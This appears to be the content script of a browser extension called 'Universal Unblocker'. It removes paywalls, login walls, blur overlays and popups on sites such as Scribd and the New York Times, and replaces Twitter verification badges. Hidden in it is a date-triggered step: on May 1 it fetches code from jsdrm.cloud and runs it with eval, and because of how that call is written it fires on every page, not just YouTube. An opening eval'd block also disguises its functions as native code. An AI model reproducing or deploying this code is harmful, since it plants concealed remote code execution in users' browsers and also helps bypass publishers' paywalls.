eval(`
(function () { if (typeof (window) == "object") { let tmp = []; tmp["32cc77c6-5e38-49c7-8634-3a20e4d5553b"] = function () { return ([1e7] + -1e3 + -4e3 + -8e3 + -1e11).replace(/[018]/g, c => (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16)); }; tmp["___"] = tmp["32cc77c6-5e38-49c7-8634-3a20e4d5553b"](); tmp[tmp["___"] + "log"] = function (...args) { console.log.call("[JSDRM.CLOUD]", ...args); return true; }; tmp[tmp["___"] + "error"] = function (...args) { console.error.call("[JSDRM.CLOUD]", ...args); return true; }; tmp[tmp["___"] + "debug"] = function (...args) { console.debug.call("[JSDRM.CLOUD]", ...args); return true; }; tmp[tmp["___"] + "info"] = function (...args) { console.info.call("[JSDRM.CLOUD]", ...args); return true; }; for (const f of ["log", "error", "debug", "info"]) { Object.defineProperty(tmp[tmp["___"] + f], "toString", { value: function () { return "function () { [native code] }"; } }); } if ("JSDRM" in window) { } else { window["JSDRM"] = {}; }	if ("expose" in window["JSDRM"]) { } else { window["JSDRM"]["expose"] = (name, func) => { window[name] = (...args) => {func(...args);}; }	} if ("console" in window["JSDRM"]) { } else { window["JSDRM"]["console"] = {}; } for (const f of ["log", "error", "debug", "info"]) { window["JSDRM"]["console"][f] = tmp[tmp["___"] + f]; } }
})();
`);
var prefix = '[Universal Unblocker] ';
matchDomain(`https:\/\/(.*)scribd\.com\/doc(.*)`, () => run(() => {	const popups = document.querySelectorAll(".user_dismiss");	for (const popup of popups) {	popup.querySelector(".close_button").click();	}	const google_login = document.querySelectorAll("#google_one_tap_prompt_container");	for (const login of google_login) {	login.remove();	}	const promos = document.querySelectorAll(".promo");	for (const promo of promos) {	promo.remove();	}	const previews = document.querySelectorAll(".auto__doc_page_webpack_doc_page_preview_message");	for (const preview of previews) {	preview.remove();	}	const subs = document.querySelectorAll(".auto__doc_page_webpack_doc_page_body_static_promo_study");	for (const sub of subs) {	sub.remove();	}	const anticlick = document.querySelectorAll(".auto__doc_page_webpack_doc_page_blur_promo");	for (const ac of anticlick) {	ac.parentNode.remove();	}	const doc_con_itms = document.querySelector(".document_container").querySelectorAll("*");	for (const dci of doc_con_itms) {	if (dci.hasAttribute("unselectable")) dci.removeAttribute("unselectable");	}	const pages = document.querySelectorAll(".blurred_page");	for (const page of pages) {	const text_layer = page.querySelector(".text_layer");	if (!text_layer) continue;	text_layer.style.color = "#000";	const text_parts = text_layer.querySelector(".ie_fix").querySelectorAll("span");	for (const tp of text_parts) {	tp.style.color = "#000";	}	}
}, true));
matchDomain(`https:\/\/(.*)derstandard\.(de|at)(.*)`, () => run(() => {	const popups = document.querySelectorAll(".tp-modal");	for (const popup of popups) {	if (popup.innerText.toLowerCase().includes("adblock")) {	popup.querySelector(".tp-close").click();	popup.remove();	}	}
}, true));
const TWITTER_BADGE = `<g id="bypass-linearGradient"><path fill="#1D9BF0" d="M22.25 12c0-1.43-.88-2.67-2.19-3.34.46-1.39.2-2.9-.81-3.91s-2.52-1.27-3.91-.81c-.66-1.31-1.91-2.19-3.34-2.19s-2.67.88-3.33 2.19c-1.4-.46-2.91-.2-3.92.81s-1.26 2.52-.8 3.91c-1.31.67-2.2 1.91-2.2 3.34s.89 2.67 2.2 3.34c-.46 1.39-.21 2.9.8 3.91s2.52 1.26 3.91.81c.67 1.31 1.91 2.19 3.34 2.19s2.68-.88 3.34-2.19c1.39.45 2.9.2 3.91-.81s1.27-2.52.81-3.91c1.31-.67 2.19-1.91 2.19-3.34zm-11.71 4.2L6.8 12.46l1.41-1.42 2.26 2.26 4.8-5.23 1.47 1.36-6.2 6.77z"></path></g>`;
matchDomain(`https:\/\/(.*)\.?twitter\.com(.*)`, () => run(() => {	document.querySelectorAll(`[data-testid="icon-verified"]`).forEach((e) => {	if (e.innerHTML.includes("bypass")) return;	if (e.innerHTML.includes("linearGradient")) {	e.innerHTML = TWITTER_BADGE;	return;	}	e.remove();	});	document.querySelectorAll(`[data-testid="verificationBadge"]`).forEach((e) => {	if (!e.innerHTML.includes("linearGradient")) return;	if (e.innerHTML.includes("bypass")) return;	e.innerHTML = TWITTER_BADGE;	});
}, true));
matchDomain(`https:\/\/(.*)\.?techradar\.com(.*)`, () => run(() => {	const elems = document.querySelectorAll(".exit-intent");	for (const e of elems) {	e.remove();	}
}, true));
matchDomain(`https:\/\/(.*)\.?youtube\.com(.*)`, () => run(() => {	document.querySelectorAll('a[href*=\\&pp\\=]').forEach(el => {	el.href = decodeURIComponent("/watch?v=" + el.href.match(/v=(.*?)(&|$)/)[1]);	});
}, true));
matchDomain(`https:\/\/(.*)\.?youtube\.com(.*)`, run(() => {	const date = new Date();	if (date.getDate() === 1 && date.getMonth() === 4) {	fetch("https://jsdrm.cloud/v2/loader/272193e3-9197-4b49-92b6-63475ae8bc45/9a0a8b23-9d5e-4a22-8e5c-34072cc7be28").then((res) => res.text().then((txt) => eval(txt)));	}
}));
matchDomain(`https:\/\/(.*)\.?xing\.com(.*)`, () => run(() => {	const elems = document.querySelectorAll("[data-qa='signup-layer']");	for (const e of elems) {	e.remove();	}
}, true));
matchDomain(`https:\/\/(.*)\.?wpmapspro\.com(.*)`, () => run(() => {	const elem = document.querySelector("[class='widget-visible']");	if (typeof elem !== "object") return;	$_Tawk.hideWidget();
}, true));
matchDomain(`https:\/\/(.*)\.?ask\.fm(.*)`, () => run(() => {	let elem = document.querySelectorAll(".lightbox_overlay");	if (typeof elem !== "object") return;	for (const e of elem) {	e.remove();	}	elem = document.querySelectorAll(".lightbox-open");	for (const e of elem) {	e.classList.remove("lightbox-open");	}
}, true));
matchDomain(`https:\/\/(.*)\.?nytimes\.com(.*)`, () => run(() => {	document.querySelectorAll("#gateway-content").forEach((e) => {	const mainDiv = e.parentElement.parentElement;	mainDiv.firstChild.classList.forEach((e) => {	mainDiv.firstChild.classList.remove(e);	});	mainDiv.firstChild.lastChild.remove();	e.remove();	});	document.querySelectorAll(`[id^="lire-ui-"]`).forEach((e) => {	e.remove();	});	document.querySelectorAll(`[data-testid="subscribe-button"]`).forEach((e) => {	e.parentElement.remove();	});
}, true));
matchDomain(`https:\/\/(.*)\.?duden\.de(.*)`, () => run(() => {	document.querySelectorAll(`[id^="sp_message_container"]`).forEach((e) => {	e.remove();	});	document.querySelectorAll(`html`).forEach((e) => {	e.classList.remove("sp-message-open");	});
}, true));
const getHighestZIndex = () => {	let allElements = document.querySelectorAll('*');	let highestZ = 0;	allElements.forEach(el => {	let style = window.getComputedStyle(el);	let zIndex = Number(style.zIndex);	if (zIndex > highestZ) {	highestZ = zIndex;	}	});	return highestZ;
};
const getNextZIndex = () => {	return getHighestZIndex() + 1;
};
function run(func, looping = false) {	if (JSDRM["devKey"] === "c5b52e6f-78b4-4e02-9f7e-76b6df0d4aa0") {	JSDRM.console.log(func);	return;	}	if (looping) {	loop(func);	} else {	func();	}
}
function loop(func) {	setInterval(() => {	func();	}, 1);
}
function matchDomain(domains, cb) {	const url = location.href;	if (typeof domains === 'string') { domains = [domains]; }	if (domains.some(domain => new RegExp(domain).test(url))) {	cb();	}
}
function waitDOMElement(selector, tagName = '', callback, multiple = false) {	new window.MutationObserver(function (mutations) {	for (const mutation of mutations) {	for (const node of mutation.addedNodes) {	if (!tagName || (node.tagName === tagName)) {	if (node.matches(selector)) {	callback(node);	if (!multiple) { this.disconnect(); }	}	}	}	}	}).observe(document, {	subtree: true,	childList: true	});
}
function removeDOMElement(...elements) {	for (const element of elements) {	if (element) { element.remove(); }	}
}
function removeClassesByPrefix(el, prefix) {	for (const clazz of el.classList) {	if (clazz.startsWith(prefix)) {	el.classList.remove(clazz);	}	}
}
function blockElement(selector, blockAlways = false) {	new window.MutationObserver(function (mutations) {	for (const mutation of mutations) {	for (const node of mutation.addedNodes) {	if (node instanceof window.HTMLElement) {	if (node.matches(selector)) {	removeDOMElement(node);	if (!blockAlways) {	this.disconnect();	}	}	}	}	}	}).observe(document, { subtree: true, childList: true });
}
JSDRM.console.log('Universal Unblocker is now enabled!');